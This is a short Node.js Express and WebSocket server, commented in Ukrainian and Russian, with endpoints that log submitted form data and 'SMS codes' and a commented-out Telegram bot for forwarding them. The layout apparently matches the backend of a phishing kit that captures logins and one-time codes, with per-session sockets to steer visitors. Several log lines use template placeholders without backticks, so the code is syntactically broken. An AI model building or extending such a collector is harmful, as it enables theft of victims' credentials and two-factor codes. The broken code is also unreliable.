const express = require('express');
const cors = require('cors');
const WebSocket = require('ws');
const path = require('path');
const http = require('http');

// =======================================================================
// --- НАСТРОЙКИ ---
const SERVER_URL = 'https://new-l8h6.onrender.com'; // Ваш URL
// --- TELEGRAM BOT (Тимчасово вимкнено для діагностики) ---
// const TELEGRAM_BOT_TOKEN = 'YOUR_TOKEN';
// const CHAT_ID = 'YOUR_CHAT_ID';
// =======================================================================

const app = express();
// --- TELEGRAM BOT (Тимчасово вимкнено для діагностики) ---
// const bot = new TelegramBot(TELEGRAM_BOT_TOKEN);

app.use(express.json());
app.use(cors());

// Маршрут для головної сторінки
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const clients = new Map(); 

// Обробка WebSocket з'єднань
wss.on('connection', (ws) => {
    console.log('Client connected via WebSocket');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(Client registered: ${data.sessionId});
            }
        } catch (e) { console.error('Error processing message:', e); }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(Client disconnected: ${sessionId});
            }
        });
    });
});

// Обробка запитів API (просто логування)
app.post('/api/submit', (req, res) => {
    console.log('Received data on /api/submit:', req.body);
    // Нічого не відправляємо в Telegram, просто відповідаємо ОК
    res.status(200).json({ message: 'Data received for diagnostics' });
});

app.post('/api/sms', (req, res) => {
    console.log('Received SMS code on /api/sms:', req.body);
    res.status(200).json({ message: 'SMS received for diagnostics' });
});

const PORT = process.env.PORT || 3000;

// ЗАПУСКАЄМО СЕРВЕР
server.listen(PORT, () => { 
    console.log(Diagnostic server is running on port ${PORT}); 
    console.log(Site should be available at ${SERVER_URL});
});
